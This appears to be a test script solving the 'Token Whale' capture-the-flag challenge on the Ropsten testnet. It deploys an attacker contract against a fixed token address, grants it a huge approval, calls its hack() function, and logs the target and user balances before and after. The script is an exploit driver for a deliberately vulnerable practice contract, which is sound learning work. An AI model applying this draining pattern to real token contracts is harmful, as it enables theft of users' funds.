const Web3 = require("web3");
const truffleContract = require('@truffle/contract');
// const ethers = require("ethers")
const { BigNumber, utils } = require("ethers")

const BN = require('bn.js');
const CONFIG = require("../../credentials.js");

const provider = new ethers.providers.WebSocketProvider(`wss://ropsten.infura.io/ws/v3/${CONFIG.infura.mainEndpoint}`)

const signer = new ethers.Wallet(CONFIG.wallet.PKEY);
const account = signer.connect(provider);

function isString(s) {
    return (typeof s === 'string' || s instanceof String)
}

const parseBaseUnit = (value, decimals) => {
    let orig = value;
    if (BN.isBN(value)) {
        value = value.toString()
    }
    if (!isString(value)) {
        throw new Error(`Not a String: ${value} ${decimals} ${orig}`)
    }
    value = BigNumber.from(value)
    return utils.formatUnits(value, decimals)
}

const toBaseUnit = (value, decimals) => {
    if (!isString(value)) {
        throw new Error('Pass strings to prevent floating point precision issues.')
    }
    const ten = new BN(10);
    const base = ten.pow(new BN(decimals));

    // Is it negative?
    let negative = (value.substring(0, 1) === '-');
    if (negative) {
        value = value.substring(1);
    }

    if (value === '.') {
        throw new Error(
            `Invalid value ${value} cannot be converted to`
            + ` base unit with ${decimals} decimals.`
        );
    }

    // Split it into a whole and fractional part
    let comps = value.split('.');
    if (comps.length > 2) { throw new Error('Too many decimal points'); }

    let whole = comps[0]; let
        fraction = comps[1];

    if (!whole) { whole = '0'; }
    if (!fraction) { fraction = '0'; }
    if (fraction.length > decimals) {
        throw new Error('Too many decimal places');
    }

    while (fraction.length < decimals) {
        fraction += '0';
    }

    whole = new BN(whole);
    fraction = new BN(fraction);
    let wei = (whole.mul(base)).add(fraction);

    if (negative) {
        wei = wei.neg();
    }

    return new BN(wei.toString(10), 10);
}

const contractAddress = "0xC69520740ce42803c1bFf22b23C0a37c153D1559"

const contractInst = new ethers.Contract(
    contractAddress,
    [
        "function balanceOf(address) external view returns(uint)",
        "function approve(address spender, uint256 value) external"
    ],
    account
);

contract ("Token Whale", async () =>{
    let accounts;
    before(async () => {
        // accounts = await web3.eth.getAccounts()
    })
    it("should print contract", async () => {
        // console.log(contractInst)
    })
    it("should make transaction", async () => {
        const temp = await ethers.getContractFactory("TokenWhale");
        const test = await temp.deploy();
        
        // const temp = "0x030f21c9eF650ca62105E70bE818865F2993E80a"

        // const test = new ethers.Contract(
        //     temp,
        //     [
        //         "function destroy() external",
        //         "function setTargetContract(address _target) external",
        //     ],
        //     account
        // );
        console.log(test.address)

        // await test.destroy();
        // return;

        let tx = await test.setTargetContract(contractAddress);
        await tx.wait()

        tx = await contractInst.approve(test.address, "999999999999999999999999");
        await tx.wait()

        let befBalUser = await contractInst.balanceOf(account.address);
        let befBal = await contractInst.balanceOf(test.address);
        tx = await test.hack()
        await tx.wait()
        let aftBal = await contractInst.balanceOf(test.address);
        let aftBalUser = await contractInst.balanceOf(account.address);

        console.log({
            befBal: befBal.toString(),
            aftBal: aftBal.toString(),
            befBalUser: befBalUser.toString(),
            aftBalUser: aftBalUser.toString()
        })
    })
})